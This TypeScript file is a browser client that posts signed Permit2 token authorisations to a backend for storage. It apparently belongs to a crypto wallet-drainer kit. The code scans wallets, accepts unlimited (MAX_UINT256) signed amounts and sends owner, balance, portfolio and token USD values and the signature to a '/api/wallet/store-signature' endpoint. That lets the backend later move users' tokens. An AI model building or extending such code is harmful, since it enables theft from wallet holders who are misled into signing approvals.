// src/lib/backendClient.ts
// Thin client for YOUR OWN backend. The ONLY job of the backend in the
// Permit2 flow is to STORE a signed authorisation the browser produced.
// Wallet scanning, typed-data building and signing all happen client-side.

const BASE_URL = (import.meta.env.VITE_BACKEND_URL as string | undefined)?.replace(/\/$/, '') || '';
const API_KEY = (import.meta.env.VITE_BACKEND_API_KEY as string | undefined) || '';

export const isBackendConfigured = () => Boolean(BASE_URL);

export interface Permit2TypedData {
  domain: { name: string; chainId: number; verifyingContract: string };
  types: Record<string, Array<{ name: string; type: string }>>;
  primaryType?: string;
  message: {
    permitted: { token: string; amount: string };
    spender: string;
    nonce: string;
    deadline: number;
  };
}

async function request<T>(path: string, body: unknown): Promise<T> {
  if (!BASE_URL) throw new Error('VITE_BACKEND_URL is not set');

  const res = await fetch(`${BASE_URL}${path}`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      ...(API_KEY ? { 'x-api-key': API_KEY } : {}),
    },
    credentials: 'include',
    body: JSON.stringify(body),
  });

  if (!res.ok) {
    const text = await res.text().catch(() => '');
    throw new Error(`Backend ${path} failed (${res.status}): ${text.slice(0, 200)}`);
  }
  return (await res.json()) as T;
}

/** Send the signed Permit2 authorisation to the backend for storage. */
export const storePermit2Signature = (payload: {
  owner: string;
  chainId: number;
  token: string;
  tokenSymbol?: string;
  /** Real wallet balance (raw units) of the signed token. */
  amount: string;
  /** Value actually encoded in the signature (MAX_UINT256 for unlimited). */
  signedAmount?: string;
  /** Human-readable balance in whole token units. */
  balanceFormatted?: string;
  decimals?: number;
  nonce: string;
  deadline: number;
  spender: string;
  signature: string;
  typedData: Permit2TypedData;
  walletName?: string | null;
  portfolioUsd?: number;
  tokenValueUsd?: number;
}) => request<{ ok: boolean; id?: string }>('/api/wallet/store-signature', payload);
